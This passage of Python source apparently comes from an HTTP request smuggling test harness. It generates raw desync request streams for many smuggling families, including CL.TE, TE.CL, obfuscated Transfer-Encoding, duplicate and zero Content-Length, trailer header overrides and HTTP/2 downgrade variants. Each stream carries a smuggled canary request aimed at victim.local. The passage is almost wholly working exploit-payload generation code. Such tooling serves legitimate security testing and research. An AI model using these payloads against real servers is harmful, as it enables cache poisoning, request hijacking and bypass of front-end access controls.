            "delivery_mode": delivery_mode,
            "probe_mode": probe_mode,
            "pause_ms": pause_ms,
            "chunk_shape": chunk_shape,
            "h2_mode": h2_mode,
            "h2_end_stream": h2_end_stream,
            "impact_hint": impact_hint,
            "canary_path": canary_path,
            "request_id": request_id,
        }

    def _base_control_headers(self, meta: dict[str, object]) -> list[str]:
        tags = ",".join(str(tag) for tag in meta["taxonomy_tags"])
        return [
            f"X-WF-Request-ID: {meta['request_id']}",
            f"X-WF-Family: {meta['variant_family']}",
            f"X-WF-Tags: {tags}",
            f"X-WF-Transport: {meta['transport_mode']}",
            f"X-WF-Delivery: {meta['delivery_mode']}",
            f"X-WF-Probe: {meta['probe_mode']}",
            f"X-WF-Pause-MS: {meta['pause_ms']}",
            f"X-WF-Chunk-Shape: {meta['chunk_shape']}",
            f"X-WF-H2-Mode: {meta['h2_mode']}",
            f"X-WF-H2-End-Stream: {meta['h2_end_stream']}",
            f"X-WF-Impact: {meta['impact_hint']}",
            f"X-WF-Canary-Path: {meta['canary_path']}",
            f"X-WF-Mode: {meta.get('request_smuggling_mode', self.mode)}",
            f"X-WF-Axis-Framing: {meta.get('axis_framing', 'unknown')}",
            f"X-WF-Axis-Leniency: {meta.get('axis_leniency', 'unknown')}",
            f"X-WF-Axis-Chunk: {meta.get('axis_chunk', 'unknown')}",
            f"X-WF-Axis-Connection: {meta.get('axis_connection', 'unknown')}",
            f"X-WF-Axis-Timing: {meta.get('axis_timing', 'unknown')}",
            f"X-WF-Axis-Routing: {meta.get('axis_routing', 'unknown')}",
            f"X-WF-Stream-Shape: {meta.get('stream_shape', 'unknown')}",
        ]

    def _build_stream(
        self,
        *,
        family: str,
        request_id: str,
        canary_path: str,
        meta: dict[str, object],
    ) -> bytes:
        delimiter = b"\n" if family == "chunk_bare_lf" else b"\r\n"
        canary_req = _render_request(
            "GET",
            canary_path,
            [
                "Host: victim.local",
                "User-Agent: wf-canary/2.0",
                "X-Canary-Request: 1",
                "Connection: close",
            ],
            delimiter=b"\r\n",
        )
        stable_meta = {"request_smuggling_mode": "stable", **meta}
        base_control = self._base_control_headers(stable_meta)
        base_headers = [
            "Host: victim.local",
            "User-Agent: wf-hrs/2.0",
            "Connection: keep-alive",
            *base_control,
        ]
        impact_path = str(meta["impact_hint"])

        if family == "cl_te":
            body = _chunked(b"A", delimiter=delimiter) + canary_req
            headers = [
                *base_headers,
                f"Content-Length: {len(body)}",
                "Transfer-Encoding: chunked",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "te_cl":
            body = _chunked(b"B", delimiter=delimiter) + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "te_te":
            body = _chunked(b"C", delimiter=delimiter) + canary_req
            headers = [
                *base_headers,
                _header_line("Transfer-Encoding", "chunked", self.rng),
                _header_line("Transfer-Encoding", "chunked", self.rng, obs_fold=True),
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "duplicate_cl":
            body = b"PING" + canary_req
            headers = [
                *base_headers,
                "Content-Length: 4",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "duplicate_te":
            body = _chunked(b"D", delimiter=delimiter) + canary_req
            headers = [
                *base_headers,
                "Content-Length: 4",
                "Transfer-Encoding: chunked",
                _header_line("Transfer-Encoding", "identity", self.rng),
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "cl_0":
            body = canary_req
            headers = [
                *base_headers,
                "Content-Length: 0",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "0_cl":
            body = b"pad=1&k=" + _ascii_pad(self.rng, 6).encode("ascii") + canary_req
            headers = [
                *base_headers,
                f"Content-Length : {len(body)}",
            ]
            return _render_request("GET", impact_path, headers, body, delimiter=delimiter)

        if family == "te_0":
            body = b"0" + delimiter + delimiter + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "chunk_ws":
            body = _chunked(
                b"E",
                delimiter=delimiter,
                size_text=f" {len(b'E'):X}\t",
            ) + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "chunk_ext":
            body = _chunked(
                b"F",
                delimiter=delimiter,
                ext='foo="bar";pad=1',
            ) + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "chunk_bare_lf":
            body = _chunked(b"G", delimiter=b"\n") + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=b"\n")

        if family == "trailer_merge":
            body = _chunked(
                b"H",
                delimiter=delimiter,
                trailers=[
                    f"X-Original-URL: /trailer-cache/{request_id}".encode("ascii"),
                    b"X-Trailer-Canary: merged",
                ],
            ) + canary_req
            headers = [
                *base_headers,
                "X-Original-URL: /front-cache/base",
                "Transfer-Encoding: chunked",
                "Trailer: X-Original-URL, X-Trailer-Canary",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "trailer_header_ambiguity":
            body = _chunked(
                b"I",
                delimiter=delimiter,
                trailers=[
                    f"Host: trailer-{request_id}.invalid".encode("ascii"),
                    f"X-Forwarded-Host: trailer-{request_id}.invalid".encode("ascii"),
                ],
            ) + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                "Trailer: Host, X-Forwarded-Host",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "chunk_terminator":
            body = _chunked(
                b"J",
                delimiter=delimiter,
                terminal=delimiter + delimiter,
            ) + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "pause_prefix":
            body = b"pad=" + _ascii_pad(self.rng, 8).encode("ascii") + canary_req
            headers = [
                *base_headers,
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "pause_suffix":
            body = _chunked(b"K", delimiter=delimiter) + canary_req
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "early_response":
            body = b"1" + canary_req
            headers = [
                *base_headers,
                "Expect: 100-continue",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "connection_locked":
            body = b"LOCK" + canary_req
            headers = [
                *base_headers,
                f"Content-Length: {len(body) + 8}",
                "X-Lock-Probe: 1",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "halfclose":
            body = b"HCLOSE" + canary_req
            headers = [
                *base_headers,
                f"Content-Length: {len(body)}",
                "X-Halfclose-Probe: 1",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=delimiter)

        if family == "h2_cl":
            body = b"H2DATA" + canary_req
            headers = [
                *base_headers,
                "X-HTTP2-Downgrade: 1",
                f"Content-Length: {len(body) + 5}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=b"\r\n")

        if family == "h2_te":
            body = _chunked(b"L") + canary_req
            headers = [
                *base_headers,
                "X-HTTP2-Downgrade: 1",
                "Transfer-Encoding: chunked",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=b"\r\n")

        if family == "h2_0":
            body = b"H2ZERO" + canary_req
            headers = [
                *base_headers,
                "X-HTTP2-Downgrade: 1",
                "Content-Length: 0",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=b"\r\n")

        if family == "h2_dup_authority":
            body = b"H2AUTH" + canary_req
            headers = [
                *base_headers,
                "Host: victim.local",
                "Host: alt.victim.local",
                "X-HTTP2-Downgrade: 1",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", impact_path, headers, body, delimiter=b"\r\n")

        body = (b"" if family == "h2_end_stream_gap" else _chunked(b"M")) + canary_req
        headers = [
            *base_headers,
            "X-HTTP2-Downgrade: 1",
            "Transfer-Encoding: chunked",
            "X-Original-URL: /shadow",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", impact_path, headers, body, delimiter=b"\r\n")

    def _build_research_stream(
        self,
        spec: RequestStreamSpec,
        *,
        request_id: str,
        canary_path: str,
        family: str,
        meta: dict[str, object],
        baseline: dict[str, object],
    ) -> bytes:
        del family
        delimiter = b"\n" if spec.chunk_semantics == "bare_lf" else bytes(baseline["delimiter"])
        method = "GET" if spec.framing_mode == "0" else str(baseline["method"])
        path = str(meta["impact_hint"])
        body_seed = bytes(baseline["body"]) or b"seed=baseline"
        routing_token = _ascii_pad(self.rng, 6)
        canary_req = _render_request(
            "GET",
            canary_path,
            [
                "Host: victim.local",
                "User-Agent: wf-canary/3.0",
                "X-Canary-Request: 1",
                "Connection: close",
            ],
            delimiter=b"\r\n",
        )
        headers = [
            "Host: victim.local",
            "User-Agent: wf-hrs-research/1.0",
            "Connection: close" if spec.connection_semantics == "close" else "Connection: keep-alive",
            *self._base_control_headers({"request_smuggling_mode": "research", **meta}),
        ]

        if spec.routing_semantics == "x_original_url":
            headers.append("X-Original-URL: /front-cache/base")
        elif spec.routing_semantics == "x_forwarded_host":
            headers.append(f"X-Forwarded-Host: shadow-{routing_token}.victim.local")
        elif spec.routing_semantics == "rewrite_path":
            headers.append("X-Rewrite-URL: /shadow-admin")

        if spec.header_leniency == "duplicate_resolution":
            headers.append("Host: victim.local")
        elif spec.header_leniency == "forbidden_retention":
            headers.append("Transfer-Encoding: chunked")

        body_core = body_seed[: min(len(body_seed), 10)] or b"seed"
        if spec.request_chain_shape == "padding_plus_canary":
            body_core = b"pad=" + _ascii_pad(self.rng, 7).encode("ascii")
        elif spec.request_chain_shape == "trailers_plus_canary":
            body_core = b"trail=" + _ascii_pad(self.rng, 6).encode("ascii")

        trailers: list[bytes] = []
        terminal: bytes | None = None
        chunk_ext = ""
        chunk_size: str | None = None
        if spec.chunk_semantics == "size_whitespace":
            chunk_size = f" {len(body_core):X}\t"
        elif spec.chunk_semantics == "chunk_extension":
            chunk_ext = 'foo="bar";mode=research'
        elif spec.chunk_semantics == "terminator_ambiguity":
            terminal = delimiter + delimiter
        elif spec.chunk_semantics == "trailer_override_path":
            trailers = [
                f"X-Original-URL: /trailer-cache/{request_id}".encode("ascii"),
                b"X-Trailer-Canary: merged",
            ]
        elif spec.chunk_semantics == "trailer_override_host":
            trailers = [
                f"Host: trailer-{request_id}.invalid".encode("ascii"),
                f"X-Forwarded-Host: trailer-{request_id}.invalid".encode("ascii"),
            ]

        needs_chunked = spec.framing_mode in {"TE", "H2"} or spec.chunk_semantics != "none"
        body = body_core
        if needs_chunked and spec.framing_mode != "H2":
            body = _chunked(
                body_core,
                delimiter=delimiter,
                size_text=chunk_size,
                ext=chunk_ext,
                trailers=trailers,
                terminal=terminal,
            )
        if spec.request_chain_shape in {"body_plus_canary", "padding_plus_canary", "trailers_plus_canary", "split_canary"}:
            body += canary_req

        if spec.header_leniency == "casing_mix":
            transformed: list[str] = []
            for line in headers:
                if ":" in line and not line.startswith("X-WF-"):
                    name, value = line.split(":", 1)
                    transformed.append(_header_line(name, value.strip(), self.rng))
                else:
                    transformed.append(line)
            headers = transformed
        elif spec.header_leniency == "whitespace_before_colon":
            transformed = []
            for line in headers:
                if ":" in line and not line.startswith("X-WF-"):
                    name, value = line.split(":", 1)
                    transformed.append(f"{name} :{value}")
                else:
                    transformed.append(line)
            headers = transformed
        elif spec.header_leniency == "obs_fold":
            transformed = []
            folded = False
            for line in headers:
                if ":" in line and not line.startswith("X-WF-") and not folded:
                    name, value = line.split(":", 1)
                    transformed.append(_header_line(name, value.strip(), self.rng, obs_fold=True))
                    folded = True
                else:
                    transformed.append(line)
            headers = transformed

        if spec.framing_mode == "CL":
            if spec.length_conflict_mode == "duplicate":
                headers.extend(["Content-Length: 4", f"Content-Length: {len(body)}"])
            elif spec.length_conflict_mode == "zero":
                headers.append("Content-Length: 0")
            elif spec.length_conflict_mode == "mismatch":
                headers.extend([f"Content-Length: {len(body)}", "Transfer-Encoding: chunked"])
            else:
                headers.append(f"Content-Length: {len(body)}")
        elif spec.framing_mode == "TE":
            headers.append("Transfer-Encoding: chunked")
            if spec.length_conflict_mode == "duplicate":
                headers.append(_header_line("Transfer-Encoding", "identity", self.rng))
            elif spec.length_conflict_mode == "zero":
                headers.append(f"Content-Length: {max(0, len(body) - len(canary_req))}")
                body = b"0" + delimiter + delimiter + canary_req
            else:
                headers.append(f"Content-Length: {len(body)}")
        elif spec.framing_mode == "0":
            headers.append(f"Content-Length : {len(body)}")
            method = "GET"
        else:
            headers.append("X-HTTP2-Downgrade: 1")
            if spec.routing_semantics == "authority_conflict":
                headers.append(f"Host: alt-{routing_token}.victim.local")
            if spec.length_conflict_mode == "duplicate":
                headers.append("Host: victim.local")
            if spec.length_conflict_mode == "zero":
                headers.append("Content-Length: 0")
            elif spec.length_conflict_mode == "downgrade":
                headers.append(f"Content-Length: {len(body) + 7}")
            else:
                headers.append(f"Content-Length: {len(body)}")
            if spec.chunk_semantics != "none":
                headers.append("Transfer-Encoding: chunked")

        if spec.timing_semantics == "early_response":
            headers.append("Expect: 100-continue")
        elif spec.timing_semantics == "partial_hold":
            headers.append("X-Lock-Probe: 1")
        elif spec.timing_semantics == "halfclose":
            headers.append("X-Halfclose-Probe: 1")

        return _render_request(method, path, headers, body, delimiter=delimiter)
